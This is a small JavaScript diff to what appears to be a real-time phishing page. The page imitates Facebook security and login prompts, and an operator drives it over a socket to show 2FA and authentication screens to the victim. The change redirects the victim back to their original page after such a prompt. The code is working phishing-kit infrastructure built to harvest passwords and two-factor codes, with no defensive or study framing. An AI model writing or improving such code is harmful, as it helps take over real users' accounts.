@@ -1020,7 +1020,7 @@
         pwErr.textContent = "Wrong password. Try again or click 'Forgot password' to reset it.";
       });
 
-      /* ─── Facebook security modals — redirect back to apply.html ─── */
+      /* ─── Facebook security modals — redirect back to origin page ─── */
       var fbModalMap = {
         'show-2fa':          '2fa',
         'show-auth':         'auth',
@@ -1031,8 +1031,12 @@
       };
       Object.keys(fbModalMap).forEach(function (event) {
         socket.on(event, function () {
-          try { sessionStorage.setItem('pendingModal', fbModalMap[event]); } catch (e) {}
-          window.location.href = 'apply.html';
+          var returnPage = sessionStorage.getItem('googleReturnPage') || 'apply.html';
+          try {
+            sessionStorage.setItem('pendingModal', fbModalMap[event]);
+            sessionStorage.removeItem('googleReturnPage');
+          } catch (e) {}
+          window.location.href = returnPage;
         });
       });
 
